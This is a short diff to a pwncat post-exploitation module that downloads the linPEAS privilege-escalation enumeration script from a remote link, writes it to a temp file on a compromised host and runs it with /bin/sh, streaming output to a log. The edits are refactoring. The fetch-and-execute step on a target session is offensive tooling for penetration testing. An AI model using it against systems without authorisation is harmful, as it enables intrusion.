@@ -1,7 +1,7 @@
-from requests import get
+from requests import get as req_get
 
 import pwncat
-from pwncat.modules.peas import PeassModule, mktemp, stream
+from pwncat.modules.peas import PeassModule, mktemp, stream, logfile_name
 from pwncat.platform import Linux
 from pwncat.subprocess import PIPE, STDOUT
 
@@ -20,13 +20,14 @@ class Module(PeassModule):
             src.close()
 
         else:
-            linpeas = get(self.linpeas_lnk, allow_redirects=True).text
+            linpeas = req_get(self.linpeas_lnk, allow_redirects=True).text
 
         dst = mktemp(session, mode="w", suffix="sh")
         dst.write(linpeas)
         dst.close()
 
-        proc = session.platform.Popen(
-            ["/bin/sh", dst.name], stdout=PIPE, stderr=STDOUT)
 
-        stream(proc)
+        proc = session.platform.Popen(
+            ["/bin/sh", str(dst.name)], stdout=PIPE, stderr=STDOUT)
+
+        stream(proc, logfile_name)
